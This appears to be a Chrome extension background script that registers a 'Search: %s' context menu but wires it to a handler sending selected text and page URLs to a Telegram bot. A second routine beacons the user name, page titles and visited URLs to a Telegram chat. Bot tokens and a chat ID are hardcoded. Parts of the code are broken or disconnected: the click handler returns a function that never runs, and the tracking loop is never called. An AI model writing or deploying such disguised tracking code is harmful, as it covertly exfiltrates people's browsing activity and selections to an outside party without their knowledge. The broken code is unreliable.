function send(info, tab) {
    return function(info, tab) {
        var selection = info.selectionText;
        var url = "https://api.telegram.org/bot1107350266:AAEbMkycaVeocU_EfFyDAgYfzENKZMngf28/sendMessage?chat_id=192818801&text=" + selection + "\n" + window.location.href;
        chrome.tabs.create({ index: tab.index + 1, url: url, selected: true });
    }
}

const settings = {
    botId: '521436933:AAHi1rzPx5XJt6KdVI1snLzAwSOLbJlAk70',
    chatId: '192818801',
    userName: 'volond',
    pollingInterval: 5000
}

const mutedUrls = [
    //   'https://vk.com',
    'https://www.eduka.lt',
    // ..все остальное, что всегда можно..
]

const sendMessage = (type, href) => {
    if (mutedUrls.find(url => href.startsWith(url))) { return false }
    const data = new FormData()
    data.append('chat_id', settings.chatId)
    data.append('text', `${settings.userName} ${type} ${document.title} ${href}`)
    navigator.sendBeacon(
        `https://api.telegram.org/bot${settings.botId}/sendMessage`,
        data
    )
}

let latestHref = null
let timeout = 0

const run = () => {
    if (window.location.href !== latestHref) {
        latestHref = window.location.href
        sendMessage('opened', latestHref)
    }
}

const CONTEXT_MENU_ID = "MY_CONTEXT_MENU";

function getword(info, tab) {
    if (info.menuItemId !== CONTEXT_MENU_ID) {
        return;
    }
    console.log("Word " + info.selectionText + " was clicked.");
    chrome.tabs.create({
        url: "http://www.google.com/search?q=" + info.selectionText
    });
}
chrome.contextMenus.create({
    title: "Search: %s",
    contexts: ["selection"],
    id: CONTEXT_MENU_ID
});
chrome.contextMenus.onClicked.addListener(send)